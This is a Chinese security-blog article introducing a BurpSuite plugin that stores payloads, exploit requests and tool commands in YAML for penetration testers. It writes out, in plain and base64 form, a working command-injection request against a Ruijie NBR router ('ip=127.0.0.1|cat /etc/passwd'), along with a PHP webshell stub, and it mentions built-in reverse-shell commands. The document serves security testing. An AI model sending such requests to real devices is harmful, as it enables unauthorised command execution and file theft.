# [工具分享 | 渗透辅助 BurpSuite 小插件](https://mp.weixin.qq.com/s?__biz=MzI5NTUzNzY3Ng==&mid=2247485496&idx=1&sn=13c439fb91db13339dea3591301cea35&chksm=ec53555bdb24dc4d254f37ade907ee252bfb083ed0c826c73babadfdd6737f5e099188daeb42&scene=126&sessionid=1681873274#rd)

2023-03-14 18:55本文共 3492 字阅读完需 14.5 分钟

> 一款帮助懒人复制麻烦的payload的插件



**免责声明**

本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。

如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。

文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。



# **About**

# 渗透辅助 BurpSuite 小插件

### 前言

1. 在渗透测试或挖 SRC 的时候每次都需要在笔记中复制一些 Payload 或 Webshell 内容觉得太麻烦了，所以打算 抄一个 Burpsuite 插件，直接在 Burpsuite 点一点操作就简单多了。
2. 在复现一些Http 请求的漏洞，每次都需要在笔记复制exp或写个简单的 python 脚本觉得太麻烦了，如果在 Burpsuite 中直接修改请求包就简单多了。
3. 每次都需要到其他目录打开一些工具，直接在BurpSuite 打开其他工具进行目录扫描等操作就简单多了

### 使用

加载插件初始化的配置文件会放在的`/用户根目录/.config/DAM/`目录下。

2、如果当前 BurpSuite 目录存在 DAM 目录和文件 就会优先访问，但是不会创建。（方便迁移）

3、使用 vscode 来修改 exp.yaml ， payload.yaml 和 tools.yaml （yaml 语法）

```perl
DAM:
|_exp.yaml
|_payload.yaml
|_tools.yaml
|_temp.req (单独启动的时候用来保存 request 请求)
payload.yaml

```

该文件是把 Payload 插入到 数据包 中 （在文件上传的时候快速插入webshell，不用再生成或者翻文件来复制粘贴了）

```php
<?php phpinfo();?>
```

需要把 payload Base64 编码

```undefined
PD9waHAgcGhwaW5mbygpOz8+
WebShell:
  蚁剑:
    PHP:
      PD9waHAgcGhwaW5mbygpOz8+
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV306aGIU1DDWWaecKx5lhh3wibIkXtEicgr9sQDicowfgowc4kUp3ibUQrULw/640?wx_fmt=png) 

**exp.yaml**





获取 host 和 Cookie 修改整个数据包（如果 Repeater 没有 Target 就使用不了）

host 和 cookie 的位置使用占位符 `%s` , 如果是未授权的就不需要 cookie。

```apache
POST /guest_auth/guestIsUp.php HTTP/1.1 
Host: %s
Connection: close Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 
Cookie: %s
Content-Type: application/x-www-form-urlencoded 
Content-Length: 56 

mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
```

然后把 exp Base64编码

```gcode
UE9TVCAvZ3Vlc3RfYXV0aC9ndWVzdElzVXAucGhwIEhUVFAvMS4xIApIb3N0OiAlcwpDb25uZWN0aW9uOiBjbG9zZSBVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxIApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEyMSBTYWZhcmkvNTM3LjM2IApDb29raWU6ICVzCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIApDb250ZW50LUxlbmd0aDogNTYgCgptYWM9MSZpcD0xMjcuMC4wLjF8Y2F0IC9ldGMvcGFzc3dkID4gdGVzdC50eHQ=
```

编写 exp.yaml（yaml 语法）

```nestedtext
设备漏洞:
  锐捷漏洞:
    锐捷NBR路由器-前台RCE:
      UE9TVCAvZ3Vlc3RfYXV0aC9ndWVzdElzVXAucGhwIEhUVFAvMS4xIApIb3N0OiAlcwpDb25uZWN0aW9uOiBjbG9zZSBVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxIApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEyMSBTYWZhcmkvNTM3LjM2IApDb29raWU6ICVzCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIApDb250ZW50LUxlbmd0aDogNTYgCgptYWM9MSZpcD0xMjcuMC4wLjF8Y2F0IC9ldGMvcGFzc3dkID4gdGVzdC50eHQ=
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30bmzNZglardvQBk5hmKW0zfrUS7rMvJBcZYHJ9rA3XIH70bMN74icDKw/640?wx_fmt=png) 

**tools.yaml**



可以直接在GUI直接新增和删除，也可以手动添加

```roboconf
ping: ping -nc 1 {host}

ffuf: ffuf.exe -w dict.txt -u {url}/FUZZ

ffuf2: ffuf.exe -w dict.txt -request {request} -request-proto http -mode clusterbomb
```

**配置**

https://www.baidu.com/index.php

- {request} 表示使用请求包
- {url} : https://www.baidu.com/index.php
- {host} : www.baidu.com
- {domain} : baidu.com
- {target} : https://www.baidu.com

### 更新日志

#### 1.0.4

添加了一些反弹shell的命令

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30OLwkfMM0q77csCDPsLzR1KfVeUkVibjVeib7Oibsfx0TNc3N11cuLxX5Q/640?wx_fmt=png) 

#### 1.0.3.1

1. 感谢 alex123-2star 师傅提交的代码：优化 Mac 快捷启动 和 请求处理（{domain} {target} ）
2. 如果当前 BurpSuite 目录存在 DAM 目录和文件 就会优先访问，但是不会创建。其次才访问 `/用户根目录/.config/DAM/` 下的文件（会创建目录和配置文件）

#### 1.0.3

1.0.3 版本所有配置都放在了`/用户根目录/.config/DAM/`，新增了一个快捷启动工具的功能，可以通过设置工具的路径和命令进行快捷启动。Linux 系统需要安装 `gnome-terminal` ，mac 没测试。

该功能主要抄的工具：

https://github.com/bit4woo/knife

https://github.com/kN6jq/gather

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30clAia0rHJxNL81coBKG384vNVwdNOVuz3215fPhCV9KJEAXwHOXDwDg/640?wx_fmt=png) 

添加保存完成之后在菜单右键可以看到工具

#### ![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30zGticZ1iccVPZr5icpeicbwjPCXEVicDCWgXlQwpIED8G8tnWMGbQFayqqg/640?wx_fmt=png)1.0.2

1.0.2 版本添加了一个 GUI 方便查看 漏洞 和 Payload

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30VXtsgzsKKfnzvibPRGRiaATVicNFGtAakVggOZSdHVmoewo8q5xrFpeow/640?wx_fmt=png) 

也可以单独运行，其他功能还没写

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30coTD2YqoY23utlUHddMXwrczGtD31qsS7J6OdVmXSwtkTaErMsTticQ/640?wx_fmt=png) 

**GitHub地址**

```awk
https://github.com/yuyan-sec/Doraemon
```

可以在Burp下创建一个目录名字叫DAM，然后在里面创建三个文件，在文件中分别写入内容。

![图片](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpUllL47jrcoQnghtpiaAV30gITr7RGia1a1ia0o8bJMIHdp6RmEV96snbNyFDraEjjCQTqDia2p3bCFQ/640?wx_fmt=png) 